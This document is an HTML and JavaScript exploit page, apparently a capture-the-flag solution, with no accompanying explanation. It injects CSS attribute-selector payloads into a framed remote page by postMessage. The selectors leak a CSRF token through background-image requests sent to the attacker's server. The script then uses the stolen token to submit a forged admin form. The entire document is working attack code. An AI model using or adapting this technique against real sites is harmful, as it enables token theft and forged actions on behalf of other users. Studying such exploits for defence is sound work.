<iframe id="frame"></iframe>
<iframe name="post-frame"></iframe>
<form id="form" method="POST" target="post-frame">
    <input name="csrf">
    <input name="user">
    <input name="score" value="10">
</form>
<script>
    // Environment
    const self    = `${window.location.protocol}//${window.location.host}`;
    const remote  = '{{REMOTE}}';
    const userId  = '{{USERID}}';
    const charset = '1234567890abcdef'.split('');

    // Config
    const productSize = 2;
    const tokenLength = 24;

    // Payloads
    const prefix = '#rater{display:block!important}';
    const fwd    = `[value^="<payload>"]+*{background:url(${self}/A<payload>)!important}`;
    const bck    = `[value$="<payload>"]~p{background:url(${self}/Z<payload>)!important}`;

    // DOM
    const frame = document.getElementById('frame');
    const form  = document.getElementById('form');
    
    // Helpers
    const sleep = async ms => new Promise(resolve => setTimeout(resolve, ms));

    function tmpl(tmplStr, maps) {
        Object.entries(maps).forEach(([k,v]) => {tmplStr=tmplStr.split(`<${k}>`).join(v)});
        return tmplStr;
    }

    function productSelf(arr, n=3) {
        if(n == 1) return arr;
        return arr.flatMap(c => productSelf(arr, n-1).map(k => c+k));
    }

    // Exploit
    function getPayload(knownFront='', knownEnd='') {
        const strs = productSelf(charset, productSize);
        const frwd = strs.map(str => tmpl(fwd, {payload: knownFront+str}));
        const back = strs.map(str => tmpl(bck, {payload: str+knownEnd}));

        return prefix + frwd.join('') + back.join('');
    }

    async function getToken() {
        let start = '';
        let end   = '';
        while(start.length + end.length < tokenLength) {
            frame.contentWindow.postMessage({
                css: getPayload(start, end)
            }, '*')

            while(true) {
                await sleep(50);
                const f = await fetch('/known');
                const resp = await f.json();
                if(resp.start != start && resp.end != end) {
                    start = resp.start;
                    end   = resp.end;
                    break;
                }
            }
        }

        return start.slice(0,tokenLength/2) + end.slice(-tokenLength/2);
    }

    async function exploit() {
        const token = await getToken();
        form.csrf.value = token;
        form.submit();
        await fetch('/getflag');
        await fetch('/reset');
    }

    // Setup
    frame.src = `${remote}/playground/${userId}`;
    form.action = `${remote}/admin/rate`;
    form.user.value = userId;

    frame.addEventListener('load', exploit);
</script>
